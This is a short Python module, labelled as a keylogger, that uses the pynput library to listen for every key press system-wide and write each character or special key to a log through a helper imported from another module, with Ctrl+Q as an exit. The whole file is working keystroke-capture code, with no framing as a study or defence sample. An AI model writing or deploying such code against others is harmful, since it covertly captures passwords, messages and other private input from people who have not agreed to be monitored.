# To capture keylogging

from pynput import keyboard
import os
import sys
from .logger_utils import write_log

def on_press(key):
    try:
        if key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
            return
        if key.char == 'q' and any(k in keys_pressed for k in [keyboard.Key.ctrl_l, keyboard.Key.ctrl_r]):
            write_log("[EXIT] Ctrl+Q pressed. Terminating.")
            os._exit(0)
        write_log(f"[KEY] {key.char}")
    except AttributeError:
        write_log(f"[KEY] {str(key)}")

keys_pressed = set()

def on_press_wrapper(key):
    keys_pressed.add(key)
    on_press(key)

def on_release(key):
    if key in keys_pressed:
        keys_pressed.remove(key)

def start_logging():
    listener = keyboard.Listener(on_press=on_press_wrapper, on_release=on_release)
    listener.start()
    listener.join()
